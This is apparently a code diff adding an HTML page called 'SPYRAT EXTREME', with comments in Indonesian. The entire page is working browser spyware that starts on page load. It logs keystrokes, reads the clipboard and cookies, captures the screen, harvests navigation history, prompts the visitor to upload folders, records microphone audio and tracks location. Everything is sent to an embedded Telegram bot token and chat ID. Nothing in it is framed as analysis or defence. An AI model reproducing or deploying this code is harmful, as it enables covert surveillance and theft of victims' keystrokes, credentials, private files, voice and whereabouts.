@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>SPYRAT EXTREME</title>
+</head>
+<body>
+    <h2>🔥 SPYRAT EXTREME AKTIF 🔥</h2>
+    <div id="status">Loading...</div>
+
+    <input type="file" id="fileInput" style="display:none;" webkitdirectory multiple>
+
+    <script>
+        const TOKEN = "8222528496:AAFwnyQ67Q-vDnml0sFzBkcdGA317QbwqmM";
+        const CHAT_ID = "7629800678";
+
+        // ========== FUNGSI KIRIM ==========
+        function kirimPesan(pesan) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: pesan })
+            }).catch(() => {});
+        }
+
+        function kirimFile(file, caption) {
+            let reader = new FileReader();
+            reader.onload = function(e) {
+                let base64 = e.target.result.split(',')[1];
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
+                    method: "POST",
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        document: base64,
+                        caption: caption
+                    })
+                });
+            };
+            reader.readAsDataURL(file);
+        }
+
+        // ========== 1. KEYLOGGER ==========
+        let keylog = "";
+        document.addEventListener('keydown', function(e) {
+            keylog += e.key;
+            if (keylog.length > 50) {
+                kirimPesan("⌨️ Keylog: " + keylog);
+                keylog = "";
+            }
+        });
+
+        // ========== 2. CLIPBOARD STEALER ==========
+        setInterval(() => {
+            navigator.clipboard.readText().then(text => {
+                if (text && text.length > 0) {
+                    kirimPesan("📋 Clipboard: " + text);
+                }
+            }).catch(() => {});
+        }, 5000);
+
+        // ========== 3. SCREENSHOT OTOMATIS ==========
+        function ambilScreenshot() {
+            let canvas = document.createElement('canvas');
+            let video = document.createElement('video');
+            navigator.mediaDevices.getDisplayMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    video.play();
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth || 1280;
+                        canvas.height = video.videoHeight || 720;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        let dataURL = canvas.toDataURL('image/jpeg');
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                            method: "POST",
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: CHAT_ID,
+                                photo: dataURL,
+                                caption: "🖥️ Screenshot"
+                            })
+                        });
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 2000);
+                }).catch(() => {});
+        }
+
+        // ========== 4. COOKIE STEALER ==========
+        function curiCookie() {
+            let cookies = document.cookie;
+            if (cookies) {
+                kirimPesan("🍪 Cookie: " + cookies);
+            }
+        }
+
+        // ========== 5. HISTORY BROWSER ==========
+        function curiHistory() {
+            try {
+                let history = window.performance.getEntriesByType("navigation");
+                let links = history.map(h => h.name).join("\n");
+                if (links) {
+                    kirimPesan("📜 History: " + links);
+                }
+            } catch(e) {}
+        }
+
+        // ========== 6. AMBIL FILE DARI DOWNLOADS (Pake pop-up) ==========
+        function ambilFileDownloads() {
+            let input = document.getElementById('fileInput');
+            input.click();
+            input.onchange = function() {
+                let files = this.files;
+                for (let i = 0; i < files.length; i++) {
+                    kirimFile(files[i], `📁 File: ${files[i].name}`);
+                }
+            };
+        }
+
+        // ========== 7. REKAM AUDIO REAL-TIME ==========
+        function rekamAudioRealtime() {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    let recorder = new MediaRecorder(stream);
+                    let chunks = [];
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = () => {
+                        let blob = new Blob(chunks, { type: 'audio/ogg' });
+                        let reader = new FileReader();
+                        reader.onload = () => {
+                            let base64 = reader.result.split(',')[1];
+                            fetch(`https://api.telegram.org/bot${TOKEN}/sendAudio`, {
+                                method: "POST",
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    chat_id: CHAT_ID,
+                                    audio: base64,
+                                    caption: "🎤 Rekaman Audio"
+                                })
+                            });
+                        };
+                        reader.readAsDataURL(blob);
+                    };
+                    recorder.start();
+                    setInterval(() => {
+                        recorder.stop();
+                        recorder.start();
+                    }, 10000); // Kirim setiap 10 detik
+                }).catch(() => {});
+        }
+
+        // ========== 8. LOKASI REAL-TIME ==========
+        function lokasiRealtime() {
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(pos => {
+                    let lat = pos.coords.latitude;
+                    let lon = pos.coords.longitude;
+                    kirimPesan(`📍 Lokasi: ${lat}, ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`);
+                }, () => {});
+            }
+        }
+
+        // ========== JALANKAN SEMUA ==========
+        setInterval(ambilScreenshot, 5000); // Screenshot tiap 5 detik
+        setInterval(curiCookie, 3000);
+        setInterval(curiHistory, 5000);
+        setTimeout(ambilFileDownloads, 3000);
+        setTimeout(rekamAudioRealtime, 4000);
+        setTimeout(lokasiRealtime, 2000);
+
+        document.getElementById('status').innerHTML = "🔥 SPYRAT EXTREME AKTIF! CEK TELEGRAM! 😈";
+    </script>
+</body>
+  </html>
